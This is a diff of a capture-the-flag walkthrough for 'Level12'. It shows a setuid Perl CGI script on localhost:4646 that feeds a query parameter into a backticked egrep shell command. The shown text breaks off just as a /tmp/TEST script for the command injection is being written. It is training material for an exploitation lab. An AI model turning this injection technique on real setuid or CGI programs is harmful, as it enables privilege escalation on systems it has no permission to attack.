@@ -1,11 +1,15 @@
 # Level12
 ## Step by step
-- In the user `level12` home directory, there is a file
+### 1. Access the `level12` Home Directory
   ```bash
   > ls
   -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
   ```
-- The `level12` fiel contains a program that  execute a CGI on request from localhost:4646 and take 2 querystrings `x` and `y`
+
+---
+### 2. Understanding the `level12` Program
+
+The `level12.pl` file contains a Perl script that listens on `localhost:4646` and takes two query strings: `x` and `y`.
   ```bash
   > cat level12.pl 
   #!/usr/bin/env perl
@@ -38,7 +42,12 @@
   
   n(t(param("x"), param("y")));
   ```
-- The goal is to execute a command in ``@output = `egrep "^$xx" /tmp/xd 2>&1`;``
+This script performs some manipulation and executes a command using egrep to search /tmp/xd
+
+---
+### 3. Exploiting the Script
+
+The goal is to execute a command via egrep within this script.
   ```bash
   > cat <<hey >/tmp/TEST
   > #!/bin/bash
